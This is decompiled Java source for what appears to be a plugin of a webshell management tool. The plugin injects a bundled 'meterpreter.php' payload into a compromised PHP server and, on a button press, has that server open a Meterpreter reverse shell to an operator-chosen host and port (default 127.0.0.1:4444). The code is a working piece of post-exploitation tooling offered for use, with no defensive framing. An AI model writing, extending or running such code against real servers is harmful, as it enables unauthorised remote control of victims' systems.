//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.php;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
        payloadName = "PhpDynamicPayload",
        Name = "PMeterpreter",
        DisplayName = "Meterpreter"
)
public class Meterpreter implements Plugin {
    private static final String CLASS_NAME = "Meterpreter";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final RTextArea tipTextArea = new RTextArea();
    private final JButton goButton = new JButton("Go");
    private final JButton loadButton = new JButton("Load");
    private final JLabel hostLabel = new JLabel("host :");
    private final JLabel portLabel = new JLabel("port :");
    private final JTextField hostTextField = new JTextField("127.0.0.1", 15);
    private final JTextField portTextField = new JTextField("4444", 7);
    private final JSplitPane meterpreterSplitPane = new JSplitPane();
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public Meterpreter() {
        this.meterpreterSplitPane.setOrientation(0);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.loadButton);
        meterpreterTopPanel.add(this.goButton);
        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
        this.initTip();
        this.panel.add(this.meterpreterSplitPane);
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/meterpreter.php");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include("Meterpreter", data)) {
                    this.loadState = true;
                    GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
                } else {
                    GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
                }
            } catch (Exception var4) {
                Log.error(var4);
                GOptionPane.showMessageDialog(this.panel, var4.getMessage(), "提示", 2);
            }
        } else {
            GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
        }

    }

    private void goButtonClick(ActionEvent actionEvent) {
        Thread thread = new Thread(new Runnable() {
            public void run() {
                String host = Meterpreter.this.hostTextField.getText().trim();
                String port = Meterpreter.this.portTextField.getText().trim();
                ReqParameter reqParamete = new ReqParameter();
                reqParamete.add("host", host);
                reqParamete.add("port", port);
                byte[] result = Meterpreter.this.payload.evalFunc("Meterpreter", "run", reqParamete);
                String resultString = Meterpreter.this.encoding.Decoding(result);
                Log.log(resultString, new Object[0]);
                GOptionPane.showMessageDialog(Meterpreter.this.panel, resultString, "提示", 1);
            }
        });
        thread.start();
        Log.log("meterpreter connect!", new Object[0]);
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    private void initTip() {
        try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/meterpreterTip.txt");
            this.tipTextArea.setText(new String(functions.readInputStream(inputStream)));
            inputStream.close();
        } catch (Exception var2) {
            Log.error(var2);
        }

    }

    public JPanel getView() {
        return this.panel;
    }
}
